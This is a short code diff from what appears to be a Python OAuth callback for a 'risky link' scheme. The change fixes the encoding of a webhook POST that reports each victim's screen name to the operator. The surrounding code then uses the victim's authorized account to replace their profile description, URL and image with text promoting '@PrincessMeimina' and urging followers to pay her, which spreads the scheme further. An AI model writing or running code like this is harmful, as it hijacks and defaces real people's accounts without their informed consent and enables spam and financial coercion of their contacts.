@@ -222,8 +222,11 @@ def callback():
         try:
             w_content=f'{screen_name} clicked your risky link https://tinyurl.com/3y97dae2'
             headers={"Content-Type":"application/json"}
-            resp,content=client.request(webhook_url,"POST",headers=headers,body={"content",w_content})
+            params=urllib.parse.urlencode({"content":w_content})
+            resp,content=client.request(webhook_url,"POST",headers=headers,body=params)
             print(resp)
+
+            
             description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
             update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
             update_profile_image(real_client)
